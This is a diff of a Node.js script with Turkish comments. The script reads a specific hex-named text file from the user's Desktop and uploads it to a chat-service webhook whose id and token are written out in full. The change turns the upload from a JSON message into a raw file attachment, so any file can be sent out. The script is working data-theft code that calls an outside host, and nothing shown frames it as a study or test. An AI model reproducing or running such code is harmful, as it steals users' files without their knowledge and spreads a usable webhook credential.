@@ -25,17 +25,15 @@ if (platform === 'win32') {
 // Dosya yolunu ve adını oluştur
 const filePath = path.join(desktopPath, '9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt');
 
-// Dosya okuma
-fs.readFile(filePath, 'utf8', (err, data) => {
+// Dosyayı oku
+fs.readFile(filePath, (err, fileData) => {
   if (err) {
     console.error('Dosya okunurken bir hata oluştu:', err);
     return;
   }
 
   // Webhook'a POST isteği gönder
-  const postData = JSON.stringify({
-    content: data
-  });
+  const postData = fileData;
 
   // POST isteği için gerekli seçenekler
   const options = {
@@ -43,8 +41,8 @@ fs.readFile(filePath, 'utf8', (err, data) => {
     path: '/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl',
     method: 'POST',
     headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': postData.length
+      'Content-Type': 'application/octet-stream',
+      'Content-Disposition': `attachment; filename="${path.basename(filePath)}"`
     }
   };
 
